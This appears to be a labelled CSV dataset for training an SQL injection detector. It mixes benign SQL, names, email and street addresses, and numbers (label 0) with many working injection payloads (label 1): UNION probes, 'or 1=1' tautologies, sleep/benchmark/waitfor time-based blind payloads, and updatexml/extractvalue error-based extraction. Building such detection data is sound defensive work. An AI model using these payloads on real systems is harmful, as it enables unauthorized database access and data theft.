Query,Label
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting',0
"-7324  )   or make_set  (  8486  =  6544,6544  )  ",1
irina,0
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",1
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY,0
SELECT everywhere ( s )  FROM western FULL OUTER JOIN,0
SELECT COUNT ( both ) FROM divide,0
8.1203E+15,0
1  )   where 1622  =  1622,1
1'  )   where 2120  =  2120,1
"  SELECT expect,thou,great FROM winter LEFT JOIN Orders ON forget.blockID =  gold.paid ORDER BY television.across",0
1'  )   as fkpn where 1100  =  1100,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
SELECT SIN ( 2 ) ;,0
"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,1
SELECT COUNT ( several ) FROM stems,0
SELECT COUNT ( DISTINCT corner )  FROM finish,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",1
SELECT * FROM easily WHERE led = 'field',0
1 or 1  =  1,1
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-thankyou.php' ORDER BY wp_posts.post_title ASC,0
"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",1
"1   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1""   )    )    union all select null,null#",1
"   SELECT date, final, cupFROM composition WHERE ground  IS NOT NULL",0
garek,0
"INSERT INTO stranger ( outside, choice, too, sea, root, smile )  VALUES  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )  ",0
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53820 )  ORDER BY meta_id ASC",0
"SELECT LOG ( 2, 4 ) ;",0
"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",1
1.34688E+15,0
"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",1
SELECT * FROM were WHERE flew = 'die'  AND  ( bright = 'cave' OR quick = 'to' ) ,0
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,1
"1%' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1
SELECT AVG ( hardly ) FROM by,0
"1%""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1
SELECT hospital FROM why,0
guntekin,0
euzaine@schnapps.com.gs,0
wenner@rpdkorea.nr,0
SELECT COUNT ( diagram )  FROM longer,0
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0
"  SELECT * FROM half WHERE excitement IN  ( 'neighbor', 'blanket', 'meant' )  ",0
bogarde4@tiendasyofertas.museum,0
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1
SELECT additional ( s )  FROM depend UNION,0
 or user like '%,1
"INSERT INTO come  ( rabbit, separate, full )  VALUES  ( 'government', 'using', 'hard' )  ",0
5.49426E+15,0
SELECT AVG ( wish ) FROM pile SELECT SUM ( duty ) ,0
laguna del marquesado,0
1  )   as afxc where 7497  =  7497,1
"   SELECT bone, paper+ ', ' + cookies+ ' ' + upper+ ', ' + meat AS bare  FROM this",0
"-4223'   )    )     )   union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",1
1'  )   as tsge where 6970  =  6970,1
SELECT UPPER ( CustomerName )  AS UppercaseCustomerName FROM Customers;,0
SELECT AVG ( Price ) FROM on,0
SELECT * FROM actually WHERE riding = 'writing' FETCH FIRST 3 ROWS ONLY,0
SELECT price ( s )  FROM office SELECT real FROM broad,0
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY,0
"  SELECT * FROM club WHERE tell NOT IN  ( 'has', 'merely', 'practice' )  ",0
arajol lo cascio,0
50700,0
"1%""  )   union all select null,null,null,null,null--",1
"   SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",1
"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",1
-7426' order by 1#,1
SELECT * FROM tribe ORDER BY river,0
m601c1te,0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",1
"1   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5200  =  5200",1
"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"-7350'   )    )     )   union all select 9207,9207,9207,9207--",1
"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1
"1'  )   where 8125  =  8125 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"SELECT DATE_ADD ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",1
SELECT AVG ( ate ) FROM wrapped SELECT SUM ( real ) ,0
 UPDATE now SET kind = 'avoid'WHERE lot = 'his',0
humfrid,0
"-5062""   )    )     )   union all select 4125,4125--",1
SELECT camera ( s )  FROM test,0
"1""   )    )    as nejd where 2885  =  2885",1
SELECT COUNT ( that )  FROM wealth,0
SELECT fought ( s )  FROM planned,0
"iif  (  5257  =  5257,1,1/0  )  ",1
SELECT * FROM related WHERE older = 'per' FETCH FIRST 3 ROWS ONLY,0
"   SELECT region, difference+ ', ' + mighty+ ' ' + ago+ ', ' + brain AS angle  FROM identity",0
0al5a4,0
"-8053"" where 5458  =  5458 or 9323  =  9323#",1
"  SELECT dressID AS ID, tune AS rhythm FROM war",0
"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",1
DELETE FROM policeman,0
"c/ mijancas, 154 3?c",0
SELECT whale ( s )  FROM join LEFT JOIN,0
SELECT cell ( s )  FROM forest LEFT JOIN,0
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886067718' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",1
"1%' union all select null,null,null,null,null,null--",1
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1
SELECT * FROM bread WHERE easier = 'affect'  AND City = 'foot',0
SELECT COUNT ( youth )  FROM hide,0
SELECT * FROM for,0
FROM  ( SELECT DISTINCT terrible FROM roar ) ,0
1  )   as bzuh where 8041  =  8041 and 6307  =  9200#,1
SELECT * FROM sum  WHERE lose = problem,0
"c/ alicante, 83,",0
"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM in WHERE curious BETWEEN thin09/01/1996nor AND lack15/31/1996personal,0
SELECT kill ( s )  FROM lamp SELECT am FROM lay,0
"  SELECT Orders.examplerID, Employees.bring, Employees.why FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.sidesID ORDER BY Orders.favoriteID",0
"  SELECT rateID AS ID, avoid AS recall FROM rice",0
jaki,0
"c/ bascuana 52, 5-e",0
-3648' where 4629  =  4629 order by 1--,1
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1
3.1201E+15,0
SELECT TOP 3 * FROM tropical SELECT * FROM settlers 3SELECT * FROM hide,0
ianace,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 31078 )  ORDER BY meta_id ASC",0
1'  )   as znak where 5203  =  5203,1
"  SELECT DATEDIFF ( ""2017-06-25"", ""2017-06-15"" ) ;",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",1
gibezzi scampini,0
mongo,0
19243,0
52207398c,0
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'guxv'  =  'guxv,1
"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",1
"  SELECT guardID AS ID, statement AS ride FROM upward",0
"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"calle alonso nuez 186, 12?b",0
hermanos gascon 141,0
SELECT courage,0
"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1
"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",1
21710,0
17773,0
1'  )   where 2808  =  2808,1
SELECT * FROM system WHERE from = 'machine' LIMIT 3,0
37428,0
SELECT AVG ( third ) FROM whether,0
" SELECT column_name ( s )  FROM saw,powder",0
1'  )   where 2753  =  2753 and   (  2739  =  8047  )  *8047--,1
"SELECT * FROM replace WHERE buffalo BETWEEN ""examine"" AND    ""choose""",0
SELECT went ( s FROM hidden RIGHT JOIN,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367537 ) ,0
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt",1
SELECT * FROM tightly FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM zulu,0
47317,0
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1
"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",1
-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,1
SELECT * FROM vertical WHERE round BETWEEN '1996-07-01' AND '1996-07-31',0
"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",1
"1%'  )   union all select null,null,null,null,null--",1
lilias,0
18567,0
SELECT * FROM salt WHERE report = 'occur'  AND  ( could = 'teeth' OR equal = 'choice' ) ,0
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0
FROM  ( SELECT DISTINCT sum FROM science ) ,0
1   )    )     )   and 6467  =  1864#,1
"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",1
SELECT * FROM office  WHERE equator NOT LIKE '[still]%',0
pent0et3o,0
"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1
SELECT * FROM children WHERE pool NOT LIKE '[perhaps]%',0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
SELECT Count ( * )  AS introduced,0
-3862'  )   or 9323  =  9323#,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",1
"1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--",1
mundy,0
SELECT * FROM brave WHERE thread = 'fully' FETCH FIRST 3 ROWS ONLY,0
"1  )   union all select null,null,null,null,null,null,null,null#",1
90946866j,0
1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm,1
roni,0
"1%'  )   union all select null,null,null#",1
"1""   )    )    as zemm where 3324  =  3324 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
53933880f,0
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
yern,0
SELECT * FROM only,0
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
SELECT TOP 50 PERCENT * FROM gravity,0
" SELECT column_name ( s )  FROM due,musical",0
"1%"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1
SELECT * FROM greatly WHERE total = 'symbol' LIMIT 3,0
SELECT steep FROM pound UNION SELECT rule FROM floor ORDER BY sentence,0
SELECT * FROM equally WHERE larger = 'has'  AND City = 'broke',0
"1%"" union all select null,null#",1
"c/ meneses, 104 6-a",0
s4g51r,0
SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLY,0
mercador,0
"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",1
undus de lerda,0
22268,0
garroch_ista,0
"   SELECT COUNT ( what ) , everybody FROM lot BY meant",0
"iif  (  7889  =  5114,1,1/0  )  ",1
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl",1
lerumeur@phd-photodecor.sj,0
"1  )   where 5615  =  5615 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,1
chanampa coromino,0
techumbre,0
shihhai0,0
taghizad,0
"   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL",0
"  SELECT centID AS ID, becoming AS tank FROM decide",0
1%'   )    )     )   and 4595  =  4595#,1
1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1
1'  )   and   (  3020  =  3020  )  *6703,1
SELECT vegetable ( s )  FROM solar LEFT JOIN,0
tubalcan,0
SELECT yard FROM twelve UNION ALL SELECT health FROM friendly ORDER BY food,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""%""  =  """,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
SELECT * FROM giant WHERE string NOT LIKE '[person]%',0
86704903d,0
037r20n0do,0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""hkjm"" like ""hkjm",1
"   SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID ) ",0
bodo,0
1'   )    )    as iipj where 6560  =  6560,1
SELECT * FROM enemy  WHERE bark NOT LIKE '[body]%',0
"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_text' LIMIT 1,0
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
fredesvinda,0
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
SELECT seldom ( s ) FROM anywhere INNER JOIN,0
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20,0
thiessen,0
42552726n,0
SELECT AVG ( seven ) FROM type,0
SELECT produce ( s ) FROM work INNER JOIN,0
"-8654' union all select 7190,7190,7190,7190,7190#",1
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY,0
"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1
"  SELECT yourselfID AS ID, highest AS break FROM sad",0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
-2516  )   where 3349  =  3349 or 4855  =  1806--,1
-7164%' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1
"  SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID",0
